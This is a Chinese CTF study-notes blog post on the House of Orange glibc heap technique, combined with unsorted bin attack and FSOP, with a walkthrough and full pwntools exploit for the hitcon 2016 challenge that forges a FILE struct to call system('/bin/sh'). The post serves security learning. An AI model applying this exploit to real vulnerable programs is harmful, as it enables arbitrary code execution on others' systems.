---
title: House of Orange
tags:
    - pwn
    - House of XXX
categories:
    - 学习笔记
cover: /img/达令.png
---
# House of Orange
## 前言
看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。

ps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。
## house of orange 简介
使用场景：当程序中没有free功能时，而我们又需要得到free chunk，就可以通过这个手段来获取free chunk
使用条件：需要要堆溢出漏洞，可以修改top chunk的size
利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。
绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000

## unsorted bin attack & FSOP 简介
### unsorted bin attack
使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用
使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk
使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址
注意事项：在此之后，无法再从unsorted bin中申请堆块

### FSOP 
篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.
1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。
2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。
3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段

## 例题
### houseoforange_hitcon_2016
分析一下exp吧，具体的一个流程有时间再补充一下。

![image-20250526224440703](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png)
1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。
2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。

![image-20250526224818280](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png)
1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有`"\x00"`覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。

![image-20250526225200971](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png)
1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。
2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。
3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.
4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。


#### exp
```python
from esy import *
context.log_level="debug"
arch='amd64'
ip='node5.buuoj.cn'
port=29775
io,elf=loadfile("houseoforange_hitcon_2016",ip,port)
libc=ELF("/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6")

def add(size,content):
	io.sendlineafter("Your choice : ",str(1))
	io.sendlineafter("Length of name :",str(size))
	io.sendafter("Name :",content)
	io.sendlineafter("Price of Orange",str(1))
	io.sendlineafter("Color of Orange",str(2))

def edit(size,content):
	io.sendlineafter("Your choice : ",str(3))
	io.sendlineafter("Length of name :",str(size))
	io.sendafter("Name:",content)
	io.sendlineafter("Price of Orange",str(1))
	io.sendlineafter("Color of Orange",str(2))

	
def show():
	io.sendlineafter('Your choice : ',str(2))

add(0x10,'a')
edit(0x40,b'b'*0x18+p64(0x21)+p64(0x0000002000000001)+p64(0)*2+p64(0xfa1))
add(0x1000,'c'*8)
add(0x400,'d'*8)
#gdb.attach(io)
show()

io.recv(0x18)
leak=u64(io.recv(6).ljust(8,b'\x00'))
libcbase=leak-0x3c5188

io_list_all=libcbase+libc.symbols['_IO_list_all']
sys_addr=libcbase+libc.symbols['system']
edit(0x20,'e'*0x10)

show()

io.recvuntil('e'*0x10)
leak_heap=u64(io.recv(6).ljust(8,b'\x00'))
logvalue("libcbase",hex(libcbase))
logvalue('leak_heap',hex(leak_heap))
payload=b'f'*0x400
payload+=p64(0)+p64(0)
payload+=p64(0)+p64(0)
payload+=b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
payload+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk
payload+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
payload+=p64(0)*7
payload+=p64(leak_heap+0x430)#chain
payload+=p64(0)*13
payload+=p64(leak_heap+0x508)
payload+=p64(0)+p64(0)+p64(sys_addr)
edit(0x1000,payload)
io.interactive()


```
## 参考博客
[关于house of orange(unsorted bin attack &&FSOP)的学习总结 - ZikH26 - 博客园](https://www.cnblogs.com/ZIKH26/articles/16712469.html)
